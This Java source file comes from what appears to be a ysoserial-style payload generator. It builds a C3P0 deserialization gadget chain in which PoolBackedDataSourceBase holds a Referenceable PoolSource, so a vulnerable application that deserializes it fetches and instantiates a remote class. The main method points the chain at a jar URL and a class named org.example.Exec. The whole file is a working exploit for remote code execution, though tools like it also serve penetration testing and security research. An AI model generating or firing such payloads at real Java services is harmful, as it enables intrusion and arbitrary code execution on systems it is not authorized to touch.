package com.ppp.chain.c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 * <p>
 * Arguments:
 * - base_url:classname
 * <p>
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11"})
@Authors({Authors.MBECHLER})
@Sink({Sink.C3P0})
public class C3P0 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(C3P0.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(C3P0.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setUrl("http://127.0.0.1:1234/ClassLoad-1.0.jar");
        sinksHelper.setClassName("org.example.Exec");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(C3P0.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
//        Object sinkObject = SinkScheduler.builder(sinksHelper);

        String url = sinksHelper.getUrl();
        String className = sinksHelper.getClassName();

        Object kickOffObject = getChain(url, className);

        return kickOffObject;
    }

    public Object getChain(String url, String className) throws Exception {
//        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
//        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        /**
         * Ref: https://github.com/frohoff/ysoserial/pull/184
         */
        PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(className, url));

        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() throws NamingException {
            return new Reference(this.className, this.className, this.url);
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

    }
}
